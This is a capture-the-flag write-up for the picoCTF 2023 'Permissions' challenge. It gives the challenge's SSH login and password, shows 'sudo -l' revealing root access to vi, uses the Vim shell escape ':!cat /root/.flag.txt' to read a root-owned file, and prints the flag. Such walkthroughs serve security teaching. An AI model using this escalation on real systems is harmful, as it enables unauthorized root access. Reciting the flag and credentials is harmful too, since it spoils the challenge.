# Permissions
| **Platform** | picoCTF 2023 |
| **Category** | General Skills |
| **Difficulty** | Medium |
| **Tool** | Vim / Linux Permissions |

## Challenge
The challenge provides SSH credentials and asks:
```text
Can you login and read the root file?
```
The provided SSH command is:
```bash
ssh -p 61887 picoplayer@saturn.picoctf.net
```
Password:
```text
33qE7mB5BF
```
The main clue is the challenge name **Permissions** and the `vim` tag.
## Step 1 – Connect to the Server
Use the provided SSH command:
```bash
ssh -p 61887 picoplayer@saturn.picoctf.net
```
Enter the provided password:
```text
33qE7mB5BF
```
After logging in, we get a shell as:
```text
picoplayer
```
## Step 2 – Check Our Sudo Permissions
The hint asks:
```text
What permissions do you have?
```
So we should check what commands our user can execute with `sudo`:
```bash
sudo -l
```
The important part of the output is:
```text
User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
This means `picoplayer` can run **Vim as root** without needing a normal root password.
This is the key to the challenge.
## Step 3 – Run Vim as Root
Since `/usr/bin/vi` can be executed with `sudo`, run:
```bash
sudo /usr/bin/vi
```
Vim opens with root privileges.
Because Vim allows commands to be executed from inside the editor, we can use Vim's shell escape feature.
## Step 4 – Use Vim Shell Escape
Inside Vim, press:
```text
:
```
Then enter:
```text
!cat /root/.flag.txt
```
So the complete Vim command is:
```vim
:!cat /root/.flag.txt
```
Press **Enter**.
Because Vim itself was launched using `sudo`, the command executed through Vim runs with root privileges.
The root flag is then displayed.
## Step 5 – Read the Flag
The root file contains:
```text
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```
This is the flag we submit.
## Why This Works
The important discovery was:
```bash
sudo -l
```
which showed:
```text
(ALL) /usr/bin/vi
```
Vim is normally a text editor, but it also has the ability to execute shell commands using:
```vim
:!command
```
Since we launched Vim as root:
```bash
sudo /usr/bin/vi
```
the shell command executed from Vim also has root privileges.
Therefore:
```vim
:!cat /root/.flag.txt
```
allows us to read the root-owned flag file.
## Important Commands
Connect to the server:
```bash
ssh -p 61887 picoplayer@saturn.picoctf.net
```
Check sudo permissions:
```bash
sudo -l
```
Run Vim with sudo:
```bash
sudo /usr/bin/vi
```
Inside Vim, execute:
```vim
:!cat /root/.flag.txt
```
## Flag
```text
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```

## Tools Used
- SSH
- Linux Terminal
- `sudo`
- `sudo -l`
- Vim / `vi`
- Shell escape `:!`
- `cat`

## Key Learning
- `sudo -l` shows which commands the current user can execute with elevated privileges.
- Allowing a user to run an interactive program such as `vi` with `sudo` can provide powerful capabilities.
- Vim can execute shell commands using:
```vim
:!command
```
- Always check sudo permissions when investigating Linux privilege-related CTF challenges.
- The important part was not directly accessing `/root`, but finding a permitted program that could execute commands with root privileges.

## Final Solution
The entire solution can be summarized as:
```text
Open Permissions
        ↓
SSH into the server
        ↓
ssh -p 61887 picoplayer@saturn.picoctf.net
        ↓
Enter password
        ↓
sudo -l
        ↓
Discover that /usr/bin/vi can be run as root
        ↓
sudo /usr/bin/vi
        ↓
Inside Vim:
:!cat /root/.flag.txt
        ↓
Read the root flag
        ↓
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
        ↓
Submit
        ↓
Correct flag!
``` 
